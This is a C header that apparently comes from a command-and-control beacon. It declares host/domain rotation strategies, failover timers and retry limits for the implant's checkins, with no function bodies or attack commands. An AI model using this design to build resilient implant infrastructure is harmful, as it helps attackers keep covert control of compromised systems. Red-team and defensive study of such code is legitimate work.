

typedef struct {
	int    strategy;              // The host/domain rotation strategy mode.
	                              //   0 = round-robin (legacy method and default)
	                              //   1 = randon rotation each checkin attempt
	                              //   2 = event based rotation
	                              //       - based on simple duration (combined success and/or failure)
	                              //       - based on failed checkin duration and count (consecutive failure count)

	int    rotation_timer;        // simple duration: number of seconds before host rotation.
	                              //     -1 = disbled
	                              //     0 = rotate after every checkin attempt (same as round-robin)
	                              //     1+ = seconds before rotation

	int    failover_timer;       // failure duration: number of seconds of consecutive checkin failure before host rotation.
	                             //     -1 = disabled
	                             //     0 = rotate after every checkin failure. (AKA: use a host until it fails)
	                             //     1+ = rotate when duration of consecutive failed checkins exceeds this value.
	int    failover_maxfail;     // failure max count: number of consecutive checkin failures before host rotation.
                                 //     -1 = disabled
	                             //     0 = rotate after every checkin failure. (AKA: use a host until it fails)
	                             //     1+ = rotate when duration of consecutive failed checkins exceeds this value.
} strategy_info;

typedef struct {
	char * host;
	char * uri;
} host_and_uri;

// host_and_uri * next_host(char * hosts, boolean lastCheckinFailed, int hostStrategy, int host_strategy_timer, int host_strategy_failx, int host_strategy_failsecs)

void strategy_setup(strategy_info * si, int strategy, int rotation_timer, int failover_timer, int failover_maxfail);
char * next_host(char * hosts, BOOL lastCheckinFailed, strategy_info * si);

BOOL check_max_retry(BOOL failedHost, int * maxRetryCount, unsigned int * sleep_time, unsigned int * maxOrigSleepTime);
